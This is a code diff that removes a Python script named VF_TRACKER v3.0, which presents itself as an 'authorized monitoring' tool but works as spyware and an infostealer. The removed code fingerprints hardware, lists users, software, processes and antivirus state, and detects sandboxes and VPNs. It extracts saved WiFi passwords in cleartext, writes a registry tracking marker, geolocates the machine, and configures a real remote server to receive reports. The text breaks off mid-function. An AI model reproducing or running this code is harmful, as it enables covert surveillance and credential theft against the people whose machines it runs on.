@@ -1,1464 +1,255 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-"""
-╔═══════════════════════════════════════════════════════════════════════════╗
-║     VF_TRACKER v3.0 — Advanced System Identity Tracker                   ║
-║     Part of the STORM_VX Architecture                                    ║
-║                                                                           ║
-║  Hardware Fingerprint | User Identity | Environment Detection            ║
-║  Deep Network Recon   | Machine ID   | Smart Reporting                   ║
-║                                                                           ║
-║  FOR AUTHORIZED MONITORING ONLY!                                          ║
-╚═══════════════════════════════════════════════════════════════════════════╝
-
-Usage:
-  python VF_TRACKER.py                           # Auto-run, save + send
-  python VF_TRACKER.py --silent                  # No console output
-  python VF_TRACKER.py --no-server               # Local only, no send
-  python VF_TRACKER.py --server http://example.com/receive.php
-"""
-
-import socket
-import uuid
-import urllib.request
-import urllib.parse
-import re
-import ssl
-import platform
-import subprocess
-import sys
-import os
-import json
-import time
-import hashlib
-import argparse
-from datetime import datetime
-
-IS_WINDOWS = platform.system() == 'Windows'
-
-# ═══════════════════════════════════════════════════════════════════════════════
-# SERVER CONFIGURATION — Must match receive.php token!
-# ═══════════════════════════════════════════════════════════════════════════════
-VF_SECRET_TOKEN = 'STORM_VX_2024_SECURE_TOKEN_CHANGE_ME'
-DEFAULT_SERVER_URL = 'http://namme.taskinoteam.ir/receive.php'
-
-# ═══════════════════════════════════════════════════════════════════════════════
-# UTILITY — Safe WMI/Command Runner
-# ═══════════════════════════════════════════════════════════════════════════════
-
-def _wmic(command_parts, timeout=8):
-    """Run a wmic or system command safely and return stripped stdout lines."""
-    try:
-        result = subprocess.run(
-            command_parts, capture_output=True, text=True,
-            timeout=timeout, encoding='utf-8', errors='replace'
-        )
-        lines = [l.strip() for l in result.stdout.split('\n') if l.strip()]
-        # Remove header line if it looks like a wmic header
-        if lines and any(hdr in lines[0].lower() for hdr in ['serialnumber', 'uuid', 'processorid', 'name', 'caption', 'product', 'version', 'last', 'fullname', 'description', 'layout', 'domain', 'driverversion', 'status', 'macaddress']):
-            lines = lines[1:]
-        return lines
-    except Exception:
-        return []
-
-
-def _run_cmd(command_str, timeout=8):
-    """Run a shell command safely and return stdout string."""
-    try:
-        result = subprocess.run(
-            command_str, shell=True, capture_output=True, text=True,
-            timeout=timeout, encoding='utf-8', errors='replace'
-        )
-        return result.stdout.strip()
-    except Exception:
-        return ""
-
-
-# ═══════════════════════════════════════════════════════════════════════════════
-# PHASE 1: HARDWARE FINGERPRINT
-# ═══════════════════════════════════════════════════════════════════════════════
-
-def get_motherboard_serial():
-    """[HW-1] Motherboard Serial Number — never changes."""
-    lines = _wmic(['wmic', 'baseboard', 'get', 'serialnumber'])
-    return lines[0] if lines else "N/A"
-
-
-def get_bios_uuid():
-    """[HW-2] BIOS UUID — unique system identifier."""
-    lines = _wmic(['wmic', 'csproduct', 'get', 'UUID'])
-    return lines[0] if lines else "N/A"
-
-
-def get_cpu_processor_id():
-    """[HW-3] CPU Processor ID — unique per processor."""
-    lines = _wmic(['wmic', 'cpu', 'get', 'processorid'])
-    return lines[0] if lines else "N/A"
-
-
-def get_disk_serial():
-    """[HW-4] Disk Drive Serial Number — physical drive serial."""
-    lines = _wmic(['wmic', 'diskdrive', 'get', 'serialnumber'])
-    return lines[0] if lines else "N/A"
-
-
-def get_gpu_info():
-    """[HW-5] GPU Model and Driver Version."""
-    if not IS_WINDOWS:
-        # Try lspci on Linux
-        try:
-            result = subprocess.run(['lspci'], capture_output=True, text=True, timeout=5)
-            gpu_lines = [l.strip() for l in result.stdout.split('\n') if 'VGA' in l or '3D' in l or 'Display' in l]
-            if gpu_lines:
-                return gpu_lines
-        except Exception:
-            pass
-        return ["N/A (Windows WMI / lspci not available)"]
-    lines = _wmic(['wmic', 'path', 'win32_videocontroller', 'get', 'name,driverversion'])
-    gpus = []
-    for line in lines:
-        parts = line.split()
-        if len(parts) >= 2:
-            version = parts[-1]
-            name = ' '.join(parts[:-1])
-            gpus.append(f"{name} (Driver: {version})")
-        elif len(parts) == 1 and parts[0]:
-            gpus.append(parts[0])
-    return gpus if gpus else ["N/A"]
-
-
-def get_battery_info():
-    """[HW-6] Battery Info (laptops only)."""
-    if not IS_WINDOWS:
-        return "N/A"
-    lines = _wmic(['wmic', 'path', 'win32_battery', 'get', 'name,estimatedchargeremaining'])
-    if not lines:
-        return "No battery detected (Desktop PC)"
-    info = []
-    for line in lines:
-        if line:
-            info.append(line.strip())
-    return ' | '.join(info) if info else "No battery detected"
-
-
-def generate_hwid(motherboard_serial, bios_uuid, cpu_id, disk_serial, mac_addr):
-    """[HW-7] Generate unique Hardware ID (SHA256 hash of all HW IDs combined)."""
-    raw = f"{motherboard_serial}|{bios_uuid}|{cpu_id}|{disk_serial}|{mac_addr}"
-    return hashlib.sha256(raw.encode('utf-8')).hexdigest()
-
-
-# ═══════════════════════════════════════════════════════════════════════════════
-# PHASE 2: USER IDENTITY & ENVIRONMENT
-# ═══════════════════════════════════════════════════════════════════════════════
-
-def get_windows_username():
-    """[ID-1] Current Windows username."""
-    try:
-        return os.getlogin()
-    except Exception:
-        try:
-            return os.environ.get('USERNAME', os.environ.get('USER', 'Unknown'))
-        except Exception:
-            return "Unknown"
-
-
-def get_user_fullname():
-    """[ID-2] Full name registered in Windows."""
-    if not IS_WINDOWS:
-        return "N/A"
-    lines = _wmic(['wmic', 'useraccount', 'where', f"name='{get_windows_username()}'", 'get', 'fullname'])
-    return lines[0] if lines else "N/A"
-
-
-def get_last_login():
-    """[ID-3] Last login time for current user."""
-    if not IS_WINDOWS:
-        return "N/A"
-    lines = _wmic(['wmic', 'useraccount', 'where', f"name='{get_windows_username()}'", 'get', 'lastlogin'])
-    return lines[0] if lines else "N/A"
-
-
-def get_installed_users():
-    """[ID-4] List of all user accounts on the system."""
-    if not IS_WINDOWS:
-        try:
-            result = subprocess.run(['cut', '-d:', '-f1', '/etc/passwd'],
-                                    capture_output=True, text=True, timeout=5)
-            return [u for u in result.stdout.strip().split('\n') if u and not u.startswith('_')]
-        except Exception:
-            return ["N/A"]
-    lines = _wmic(['wmic', 'useraccount', 'get', 'name'])
-    return lines if lines else ["N/A"]
-
-
-def get_domain_workgroup():
-    """[ID-5] Domain or Workgroup name."""
-    if not IS_WINDOWS:
-        return "N/A"
-    domain_lines = _wmic(['wmic', 'computersystem', 'get', 'domain'])
-    wg_lines = _wmic(['wmic', 'computersystem', 'get', 'workgroup'])
-    domain = domain_lines[0] if domain_lines else "?"
-    workgroup = wg_lines[0] if wg_lines else "?"
-    return f"Domain: {domain} | Workgroup: {workgroup}"
-
-
-def get_installed_programs():
-    """[ID-6] List of installed programs (name + version)."""
-    if not IS_WINDOWS:
-        return ["N/A (Windows WMI only)"]
-    try:
-        result = subprocess.run(
-            ['wmic', 'product', 'get', 'name,version'],
-            capture_output=True, text=True, timeout=15, encoding='utf-8', errors='replace'
-        )
-        lines = [l.strip() for l in result.stdout.split('\n') if l.strip()]
-        if len(lines) > 1:
-            # Skip header
-            programs = []
-            for line in lines[1:]:
-                parts = line.rsplit(None, 1)
-                if len(parts) == 2:
-                    programs.append(f"{parts[0]} (v{parts[1]})")
-                elif len(parts) == 1 and parts[0]:
-                    programs.append(parts[0])
-            return programs[:50]  # Limit to 50 programs
-        return ["No programs found"]
-    except subprocess.TimeoutExpired:
-        return ["Timeout - WMI product query too slow"]
-    except Exception:
-        return ["Error retrieving"]
-
-
-def get_running_processes():
-    """[ID-7] Running processes (top 30 by name)."""
-    try:
-        if IS_WINDOWS:
-            lines = _wmic(['wmic', 'process', 'get', 'name'], timeout=10)
-        else:
-            result = subprocess.run(['ps', '-eo', 'comm'], capture_output=True,
-                                    text=True, timeout=5)
-            lines = [l.strip() for l in result.stdout.split('\n') if l.strip()][1:]
-        # Deduplicate and sort
-        unique = sorted(set(lines))
-        return unique[:30] if unique else ["None found"]
-    except Exception:
-        return ["Error retrieving"]
-
-
-def get_antivirus_info():
-    """[ID-8] Antivirus software detection."""
-    if not IS_WINDOWS:
-        return ["N/A"]
-    try:
-        result = subprocess.run(
-            ['wmic', '/namespace:\\\\root\\securitycenter2', 'path',
-             'antivirusproduct', 'get', 'displayName,productState'],
-            capture_output=True, text=True, timeout=8, encoding='utf-8', errors='replace'
-        )
-        lines = [l.strip() for l in result.stdout.split('\n') if l.strip()]
-        if len(lines) > 1:
-            avs = []
-            for line in lines[1:]:
-                if line:
-                    # Decode productState: 266240 = enabled, 393216 = disabled, 397312 = updating
-                    parts = line.split()
-                    if len(parts) >= 2:
-                        state_hex = parts[-1]
-                        try:
-                            state_int = int(state_hex)
-                            if state_int in [266240, 266256]:
-                                status = "Enabled"
-                            elif state_int in [393216, 393232]:
-                                status = "Disabled"
-                            elif state_int in [397312, 397328]:
-                                status = "Updating"
-                            else:
-                                status = f"Unknown({state_hex})"
-                            name = ' '.join(parts[:-1])
-                            avs.append(f"{name} [{status}]")
-                        except ValueError:
-                            avs.append(line)
-                    else:
-                        avs.append(line)
-            return avs if avs else ["No antivirus detected"]
-        return ["No antivirus detected"]
-    except Exception:
-        return ["Access denied / Not available"]
-
-
-def detect_vm_sandbox():
-    """[ID-9] Detect Virtual Machine or Sandbox environment."""
-    indicators = []
-    if not IS_WINDOWS:
-        return ["N/A (Windows detection only)"]
-
-    # Check 1: MAC address vendor prefixes for VMs
-    mac = get_mac_address().lower()
-    vm_mac_prefixes = ['00:0c:29', '00:50:56', '00:05:69',  # VMware
-                       '08:00:27', '0a:00:27',               # VirtualBox
-                       '00:15:5d',                           # Hyper-V
-                       '00:1c:42',                           # Parallels
-                       '52:54:00']                           # QEMU/KVM
-    for prefix in vm_mac_prefixes:
-        if mac.startswith(prefix):
-            indicators.append(f"VM MAC detected: {mac} (prefix: {prefix})")
-            break
-
-    # Check 2: VM-specific processes
-    vm_processes = ['vmtoolsd.exe', 'vmwaretray.exe', 'vmwareuser.exe',
-                    'vboxservice.exe', 'vboxtray.exe', 'xenservice.exe',
-                    'prl_tools.exe', 'prl_cc.exe', 'spoolsv.exe']
-    try:
-        result = subprocess.run(['wmic', 'process', 'get', 'name'],
-                                capture_output=True, text=True, timeout=5,
-                                encoding='utf-8', errors='replace')
-        running = result.stdout.lower()
-        for vp in vm_processes:
-            if vp.lower() in running:
-                indicators.append(f"VM process: {vp}")
-    except Exception:
-        pass
-
-    # Check 3: VM-specific registry keys
-    try:
-        result = subprocess.run(
-            ['reg', 'query', 'HKLM\\SOFTWARE\\VMware, Inc.'],
-            capture_output=True, text=True, timeout=3)
-        if result.returncode == 0:
-            indicators.append("VMware registry key found")
-    except Exception:
-        pass
-
-    try:
-        result = subprocess.run(
-            ['reg', 'query', 'HKLM\\SOFTWARE\\Oracle\\VirtualBox'],
-            capture_output=True, text=True, timeout=3)
-        if result.returncode == 0:
-            indicators.append("VirtualBox registry key found")
-    except Exception:
-        pass
-
-    # Check 4: System model via WMI
-    model_lines = _wmic(['wmic', 'computersystem', 'get', 'model'])
-    if model_lines:
-        model = model_lines[0].lower()
-        vm_keywords = ['virtual', 'vmware', 'virtualbox', 'qemu', 'kvm',
-                       'xen', 'hyper-v', 'parallels']
-        for kw in vm_keywords:
-            if kw in model:
-                indicators.append(f"System model contains: {model_lines[0]}")
-                break
-
-    # Check 5: Low RAM check (VMs often have < 4GB)
-    ram_lines = _wmic(['wmic', 'OS', 'get', 'TotalVisibleMemorySize'])
-    if ram_lines:
-        try:
-            ram_kb = int(ram_lines[0].split()[0])
-            ram_gb = ram_kb / 1024 / 1024
-            if ram_gb < 4:
-                indicators.append(f"Low RAM: {ram_gb:.1f} GB (possible VM)")
-        except Exception:
-            pass
-
-    # Check 6: Single CPU core check
-    cpu_count = os.cpu_count()
-    if cpu_count and cpu_count == 1:
-        indicators.append("Single CPU core (possible VM)")
-
-    if not indicators:
-        return ["No VM/Sandbox indicators detected (likely physical machine)"]
-    return indicators
-
-
-def get_timezone_locale():
-    """[ID-10] Timezone and Locale information."""
-    tz_name = time.tzname
-    tz_offset = time.strftime('%z')
-    try:
-        import locale
-        try:
-            locale_str = locale.getlocale()[0] or "Unknown"
-        except Exception:
-            locale_str = os.environ.get('LANG', os.environ.get('LC_ALL', 'Unknown'))
-    except Exception:
-        locale_str = "Unknown"
-    return f"TZ: {tz_name[0]} (UTC{tz_offset}) | Locale: {locale_str}"
-
-
-def get_keyboard_layout():
-    """[ID-11] Keyboard layout(s) in use."""
-    if not IS_WINDOWS:
-        return "N/A"
-    lines = _wmic(['wmic', 'keyboard', 'get', 'layout'])
-    if lines:
-        return ', '.join(lines)
-    # Fallback: check registry
-    try:
-        result = subprocess.run(
-            ['reg', 'query', 'HKCU\\Keyboard Layout\\Preload'],
-            capture_output=True, text=True, timeout=3)
-        if result.stdout:
-            layouts = re.findall(r'REG_SZ\s+(\S+)', result.stdout)
-            if layouts:
-                return ', '.join(layouts)
-    except Exception:
-        pass
-    return "Unknown"
-
-
-def detect_vpn_proxy():
-    """[ID-12] Detect VPN or Proxy usage."""
-    indicators = []
-
-    if IS_WINDOWS:
-        # Check for VPN adapter names
-        try:
-            result = subprocess.run(['wmic', 'nic', 'get', 'name,netenabled'],
-                                    capture_output=True, text=True, timeout=5,
-                                    encoding='utf-8', errors='replace')
-            vpn_keywords = ['vpn', 'tunnel', 'tap', 'tun', 'wireguard',
-                            'nordvpn', 'expressvpn', 'proton', 'mullvad',
-                            'cyberghost', 'surfshark', 'hideme', 'openvpn']
-            for line in result.stdout.split('\n'):
-                line_lower = line.lower()
-                for kw in vpn_keywords:
-                    if kw in line_lower and 'true' in line.lower():
-                        indicators.append(f"VPN adapter: {line.strip()}")
-                        break
-        except Exception:
-            pass
-
-        # Check for proxy settings
-        try:
-            result = subprocess.run(
-                ['reg', 'query',
-                 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings',
-                 '/v', 'ProxyEnable'],
-                capture_output=True, text=True, timeout=3)
-            if '0x1' in result.stdout:
-                indicators.append("System proxy: ENABLED")
-                # Get proxy server
-                result2 = subprocess.run(
-                    ['reg', 'query',
-                     'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings',
-                     '/v', 'ProxyServer'],
-                    capture_output=True, text=True, timeout=3)
-                proxy_match = re.search(r'REG_SZ\s+(.+)', result2.stdout)
-                if proxy_match:
-                    indicators.append(f"Proxy server: {proxy_match.group(1).strip()}")
-            elif '0x0' in result.stdout:
-                indicators.append("System proxy: Disabled")
-        except Exception:
-            pass
-
-    else:
-        # Linux: check for tun/tap interfaces
-        try:
-            result = subprocess.run(['ip', 'link', 'show'], capture_output=True,
-                                    text=True, timeout=5)
-            if 'tun' in result.stdout.lower() or 'tap' in result.stdout.lower():
-                indicators.append("VPN interface (tun/tap) detected")
-        except Exception:
-            pass
-
-        # Check environment for proxy
-        for var in ['http_proxy', 'https_proxy', 'HTTP_PROXY', 'HTTPS_PROXY']:
-            val = os.environ.get(var)
-            if val:
-                indicators.append(f"Proxy env: {var}={val}")
-
-    if not indicators:
-        return ["No VPN/Proxy detected"]
-    return indicators
-
-
-# ═══════════════════════════════════════════════════════════════════════════════
-# PHASE 3: DEEP NETWORK RECON
-# ═══════════════════════════════════════════════════════════════════════════════
-
-def get_current_wifi_info():
-    """[NET-1,2] Current WiFi SSID and Signal Strength."""
-    if not IS_WINDOWS:
-        return "N/A", "N/A"
-    try:
-        result = subprocess.run(['netsh', 'wlan', 'show', 'interfaces'],
-                                capture_output=True, text=True, timeout=5,
-                                encoding='utf-8', errors='replace')
-        ssid_match = re.search(r'(?:SSID|Profile)\s*:\s*(.+)', result.stdout)
-        signal_match = re.search(r'Signal\s*:\s*(.+)', result.stdout)
-
-        ssid = ssid_match.group(1).strip() if ssid_match else "Not connected"
-        signal = signal_match.group(1).strip() if signal_match else "N/A"
-        return ssid, signal
-    except Exception:
-        return "Error", "Error"
-
-
-def get_all_wifi_profiles():
-    """[NET-3] All previously connected WiFi networks — movement history."""
-    if not IS_WINDOWS:
-        return ["N/A (Windows only)"]
-    try:
-        result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'],
-                                capture_output=True, text=True, timeout=5,
-                                encoding='utf-8', errors='replace')
-        profiles = re.findall(r':\s+(.+)\s*$', result.stdout, re.MULTILINE)
-        return [p.strip() for p in profiles if p.strip()] if profiles else ["No WiFi profiles"]
-    except Exception:
-        return ["Error retrieving"]
-
-
-def get_dns_servers():
-    """[NET-4] DNS server addresses."""
-    if not IS_WINDOWS:
-        try:
-            result = subprocess.run(['cat', '/etc/resolv.conf'],
-                                    capture_output=True, text=True, timeout=5)
-            dns_lines = []
-            for l in result.stdout.split('\n'):
-                if l.strip().startswith('nameserver'):
-                    ip = l.strip().replace('nameserver', '').strip()
-                    if ip:
-                        dns_lines.append(ip)
-            return dns_lines if dns_lines else ["Not found"]
-        except Exception:
-            return ["Error"]
-    try:
-        result = subprocess.run(['ipconfig', '/all'],
-                                capture_output=True, text=True, timeout=5,
-                                encoding='utf-8', errors='replace')
-        dns_matches = re.findall(r'DNS Servers?\s*\.+\s*:\s*([\d\.]+)', result.stdout)
-        return dns_matches if dns_matches else ["Not found"]
-    except Exception:
-        return ["Error"]
-
-
-def get_dhcp_server():
-    """[NET-5] DHCP server address."""
-    if not IS_WINDOWS:
-        return "N/A"
-    try:
-        result = subprocess.run(['ipconfig', '/all'],
-                                capture_output=True, text=True, timeout=5,
-                                encoding='utf-8', errors='replace')
-        match = re.search(r'DHCP Server\s*\.+\s*:\s*([\d\.]+)', result.stdout)
-        return match.group(1) if match else "Not found"
-    except Exception:
-        return "Error"
-
-
-def get_all_network_adapters():
-    """[NET-6] All network adapters with details."""
-    if not IS_WINDOWS:
-        try:
-            result = subprocess.run(['ip', 'link', 'show'],
-                                    capture_output=True, text=True, timeout=5)
-            return [l.strip() for l in result.stdout.split('\n') if l.strip()][:10]
-        except Exception:
-            return ["Error"]
-    try:
-        result = subprocess.run(
-            ['wmic', 'nic', 'get', 'name,macaddress,netenabled,speed'],
-            capture_output=True, text=True, timeout=5,
-            encoding='utf-8', errors='replace'
-        )
-        lines = [l.strip() for l in result.stdout.split('\n') if l.strip()]
-        if len(lines) > 1:
-            adapters = []
-            for line in lines[1:]:
-                if line:
-                    adapters.append(line)
-            return adapters if adapters else ["None found"]
-        return ["None found"]
-    except Exception:
-        return ["Error retrieving"]
-
-
-def get_proxy_settings():
-    """[NET-8] Detailed proxy settings."""
-    if not IS_WINDOWS:
-        # Check env vars
-        proxies = []
-        for var in ['http_proxy', 'https_proxy', 'ftp_proxy', 'no_proxy']:
-            val = os.environ.get(var, os.environ.get(var.upper()))
-            if val:
-                proxies.append(f"{var}={val}")
-        return proxies if proxies else ["No proxy settings"]
-
-    settings = []
-    try:
-        # WinHTTP proxy
-        result = subprocess.run(['netsh', 'winhttp', 'show', 'proxy'],
-                                capture_output=True, text=True, timeout=3,
-                                encoding='utf-8', errors='replace')
-        if 'Direct access' in result.stdout:
-            settings.append("WinHTTP: Direct (no proxy)")
-        else:
-            proxy_match = re.search(r'Proxy Server\s*:\s*(.+)', result.stdout)
-            if proxy_match:
-                settings.append(f"WinHTTP Proxy: {proxy_match.group(1).strip()}")
-    except Exception:
-        pass
-
-    try:
-        # IE/System proxy
-        result = subprocess.run(
-            ['reg', 'query',
-             'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings',
-             '/v', 'ProxyEnable'],
-            capture_output=True, text=True, timeout=3)
-        if '0x1' in result.stdout:
-            result2 = subprocess.run(
-                ['reg', 'query',
-                 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings',
-                 '/v', 'ProxyServer'],
-                capture_output=True, text=True, timeout=3)
-            proxy_match = re.search(r'REG_SZ\s+(.+)', result2.stdout)
-            if proxy_match:
-                settings.append(f"System Proxy: {proxy_match.group(1).strip()}")
-        else:
-            settings.append("System Proxy: Disabled")
-    except Exception:
-        pass
-
-    return settings if settings else ["No proxy settings found"]
-
-
-# ═══════════════════════════════════════════════════════════════════════════════
-# PHASE 3 (CONT): MACHINE ID & REGISTRY MARKER
-# ═══════════════════════════════════════════════════════════════════════════════
-
-def generate_machine_id(hwid):
-    """[MID-1] Generate a short Machine ID for quick identification."""
-    return hashlib.md5(hwid.encode('utf-8')).hexdigest()[:16].upper()
-
-
-def save_registry_marker(machine_id):
-    """[MID-2] Save a marker in Windows Registry for re-identification."""
-    if not IS_WINDOWS:
-        return False, "N/A (Windows only)"
-    try:
-        result = subprocess.run(
-            ['reg', 'add', 'HKLM\\SOFTWARE\\STORM_VX',
-             '/v', 'MachineID', '/t', 'REG_SZ', '/d', machine_id, '/f'],
-            capture_output=True, text=True, timeout=5
-        )
-        if result.returncode == 0:
-            return True, "Marker saved"
-        return False, "Failed (needs Admin)"
-    except Exception as e:
-        return False, str(e)
-
-
-def check_existing_marker():
-    """[MID-3] Check if this machine was already tracked before."""
-    if not IS_WINDOWS:
-        return None, "N/A"
-    try:
-        result = subprocess.run(
-            ['reg', 'query', 'HKLM\\SOFTWARE\\STORM_VX', '/v', 'MachineID'],
-            capture_output=True, text=True, timeout=3
-        )
-        match = re.search(r'REG_SZ\s+(\S+)', result.stdout)
-        if match:
-            return match.group(1), "Previously tracked"
-        return None, "First time"
-    except Exception:
-        return None, "First time (or access denied)"
-
-
-def generate_maps_link(lat, lon):
-    """[MID-4] Generate Google Maps link from coordinates."""
-    if lat and lon and lat not in ("Unknown", "\u0646\u0627\u0645\u0634\u062e\u0635") and lon not in ("Unknown", "\u0646\u0627\u0645\u0634\u062e\u0635"):
-        return f"https://www.google.com/maps?q={lat},{lon}"
-    return "N/A"
-
-
-# ═══════════════════════════════════════════════════════════════════════════════
-# ORIGINAL FUNCTIONS (kept from v1)
-# ═══════════════════════════════════════════════════════════════════════════════
-
-def is_admin():
-    try:
-        if IS_WINDOWS:
-            import ctypes
-            return ctypes.windll.shell32.IsUserAnAdmin() != 0
-        else:
-            return os.geteuid() == 0
-    except Exception:
-        return False
-
-
-def get_local_ip():
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.connect(("8.8.8.8", 80))
-        local_ip = s.getsockname()[0]
-        s.close()
-        return local_ip
-    except Exception:
-        return "Error"
-
-
-def get_mac_address():
-    mac = uuid.getnode()
-    return ":".join([f"{(mac >> elements) & 0xff:02x}" for elements in range(0, 8*6, 8)][::-1])
-
-
-def get_os_info():
-    os_name = platform.system()
-    os_release = platform.release()
-    os_version = platform.version()
-    processor = platform.processor()
-    arch = platform.machine()
-    os_str = f"{os_name} {os_release} ({arch})"
-    cpu_str = f"{processor if processor else 'Unknown'}"
-    return os_str, cpu_str
-
-
-def get_system_uptime():
-    try:
-        if IS_WINDOWS:
-            result = subprocess.run(['wmic', 'os', 'get', 'LastBootUpTime'],
-                                    capture_output=True, text=True, timeout=5)
-            lines = [l.strip() for l in result.stdout.split('\n') if l.strip()]
-            if len(lines) > 1:
-                boot_time_str = lines[1]
-                if boot_time_str:
-                    return f"{boot_time_str[0:4]}/{boot_time_str[4:6]}/{boot_time_str[6:8]} - {boot_time_str[8:10]}:{boot_time_str[10:12]}"
-        else:
-            result = subprocess.run(['uptime', '-s'], capture_output=True, text=True, timeout=5)
-            if result.stdout.strip():
-                return result.stdout.strip()
-        return "Not supported on this OS"
-    except Exception:
-        return "Error retrieving"
-
-
-def get_hardware_resources():
-    info = {}
-    try:
-        if IS_WINDOWS:
-            mem_cmd = subprocess.run(['wmic', 'OS', 'get', 'TotalVisibleMemorySize,FreePhysicalMemory'],
-                                     capture_output=True, text=True, timeout=5)
-            mem_lines = [l.strip() for l in mem_cmd.stdout.split('\n')
-                         if l.strip() and 'TotalVisible' not in l]
-            if mem_lines:
-                parts = mem_lines[0].split()
-                if len(parts) >= 2:
-                    info['RAM'] = f"Total: {int(parts[0])/1024:.1f} GB | Free: {int(parts[1])/1024:.1f} GB"
-            disk_cmd = subprocess.run(['wmic', 'logicaldisk', 'get', 'size,freespace,caption'],
-                                      capture_output=True, text=True, timeout=5)
-            for line in disk_cmd.stdout.split('\n'):
-                if 'C:' in line:
-                    parts = line.split()
-                    if len(parts) >= 3:
-                        info['Disk C:'] = f"Total: {int(parts[2])/(1024**3):.1f} GB | Free: {int(parts[1])/(1024**3):.1f} GB"
-                        break
-        else:
-            try:
-                with open('/proc/meminfo', 'r') as f:
-                    meminfo = {}
-                    for line in f:
-                        parts = line.split()
-                        if len(parts) >= 2:
-                            meminfo[parts[0].rstrip(':')] = int(parts[1])
-                    total = meminfo.get('MemTotal', 0) / 1024
-                    free = meminfo.get('MemAvailable', meminfo.get('MemFree', 0)) / 1024
-                    info['RAM'] = f"Total: {total:.1f} GB | Free: {free:.1f} GB"
-            except Exception:
-                pass
-        return info if info else {"Status": "No information found"}
-    except Exception:
-        return {"Error": "Failed to retrieve hardware info"}
-
-
-def get_default_gateway():
-    try:
-        if IS_WINDOWS:
-            result = subprocess.run(['ipconfig'], capture_output=True, text=True,
-                                    timeout=5, encoding='utf-8')
-            match = re.search(r'Default Gateway\.+:\s*([\d\.]+)', result.stdout)
-            return match.group(1) if match else "Not found"
-        else:
-            result = subprocess.run(['ip', 'route'], capture_output=True, text=True, timeout=5)
-            match = re.search(r'default via ([\d\.]+)', result.stdout)
-            return match.group(1) if match else "Not found"
-    except Exception:
-        return "Error"
-
-
-def get_active_connections():
-    try:
-        command = 'netstat -ano' if IS_WINDOWS else 'ss -tulpn'
-        result = subprocess.run(command, shell=True, capture_output=True, text=True,
-                                timeout=5, encoding='utf-8')
-        established = [line.strip() for line in result.stdout.split('\n')
-                       if 'ESTABLISHED' in line]
-        return established[:5]
-    except Exception:
-        return ["Error retrieving connections"]
-
-
-def get_arp_table():
-    try:
-        result = subprocess.run(['arp', '-a'], capture_output=True, text=True,
-                                timeout=5, encoding='utf-8')
-        devices = [line.strip() for line in result.stdout.split('\n')
-                   if re.search(r'\d+\.\d+\.\d+\.\d+', line)]
-        return devices[:5]
-    except Exception:
-        return ["ARP access blocked"]
-
-
-def get_firewall_status():
-    if not IS_WINDOWS:
-        return ["Only supported on Windows"]
-    try:
-        result = subprocess.run(['netsh', 'advfirewall', 'show', 'allprofiles', 'state'],
-                                capture_output=True, text=True, timeout=5, encoding='utf-8')
-        profiles = [line.strip() for line in result.stdout.split('\n')
-                    if 'ON' in line or 'OFF' in line]
-        return profiles if profiles else ["Error retrieving"]
-    except Exception:
-        return ["Requires Admin access"]
-
-
-def get_wifi_passwords():
-    if not IS_WINDOWS:
-        return [("Non-Windows OS", "This feature is only supported on Windows")]
-    wifi_list = []
-    try:
-        profiles_cmd = subprocess.run(['netsh', 'wlan', 'show', 'profiles'],
-                                       capture_output=True, text=True, timeout=5,
-                                       encoding='utf-8', errors='replace')
-        profile_names = re.findall(r':\s+(.+)\s*$', profiles_cmd.stdout, re.MULTILINE)
-        for name in profile_names:
-            detail_cmd = subprocess.run(['netsh', 'wlan', 'show', 'profile',
-                                          f'name={name}', 'key=clear'],
-                                         capture_output=True, text=True, timeout=5,
-                                         encoding='utf-8', errors='replace')
-            password_match = re.search(r'\u0645\u062d\u062a\u0648\u0627\u06cc \u06a9\u0644\u06cc\u062f\s*:\s*(.+)\s*$',
-                                       detail_cmd.stdout, re.MULTILINE)
-            if not password_match:
-                password_match = re.search(r'Key Content\s*:\s*(.+)\s*$',
-                                           detail_cmd.stdout, re.MULTILINE)
-            password = password_match.group(1) if password_match else "(No access / Open)"
-            wifi_list.append((name.strip(), password.strip()))
-    except Exception as e:
-        return [("Error", str(e))]
-    return wifi_list
-
-
-def get_info_from_numberia():
-    """
-    Public IP & geolocation from ipnumberia.com.
-    Supports both English and Persian labels (Farsi).
-    Uses multi-strategy coordinate extraction to handle any page format.
-    """
-    url = "https://ipnumberia.com/"
-    headers = {
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
-                       '(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
-    }
-    req = urllib.request.Request(url, headers=headers)
-    ctx = ssl._create_unverified_context()
-
-    public_ip = "\u06cc\u0627\u0641\u062a \u0646\u0634\u062f"     # یافت نشد
-    isp = "\u0646\u0627\u0645\u0634\u062e\u0635"                   # نامشخص
-    country = "\u0646\u0627\u0645\u0634\u062e\u0635"               # نامشخص
-    city = "\u0646\u0627\u0645\u0634\u062e\u0635"                   # نامشخص
-    coords = "\u0646\u0627\u0645\u0634\u062e\u0635"                 # نامشخص
-
-    try:
-        response = urllib.request.urlopen(req, timeout=10, context=ctx)
-        html = response.read().decode('utf-8')
-
-        # ─── 1. Find Public IP ───
-        ip_match = re.search(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', html)
-        if ip_match:
-            public_ip = ip_match.group(0)
-
-            # ─── 2. Context window around IP (for country, city, ISP) ───
-            start = max(0, ip_match.start() - 2000)
-            end = min(len(html), ip_match.end() + 2000)
-            context_html = html[start:end]
-
-            # Clean HTML tags in context slice
-            clean_text = re.sub(r'<[^>]+>', ' ', context_html)
-            clean_text = re.sub(r'\s+', ' ', clean_text)
-
-            # ─── 3. Extract Country (English + Persian labels) ───
-            c_match = re.search(
-                r'(?:\u06a9\u0634\u0648\u0631|Country)\s*:?\s*([^\s,<]{2,30})',
-                clean_text, re.IGNORECASE)
-            if c_match:
-                country = c_match.group(1)
-
-            # ─── 4. Extract City (English + Persian labels) ───
-            city_match = re.search(
-                r'(?:\u0634\u0647\u0631|City|\u0627\u0633\u062a\u0627\u0646|Province)\s*:?\s*([^\s,<]{2,30})',
-                clean_text, re.IGNORECASE)
-            if city_match:
-                city = city_match.group(1)
-
-            # ─── 5. Extract Coordinates — Multi-Strategy ───
-            # Also clean the FULL page for coordinate search (coords might be far from IP)
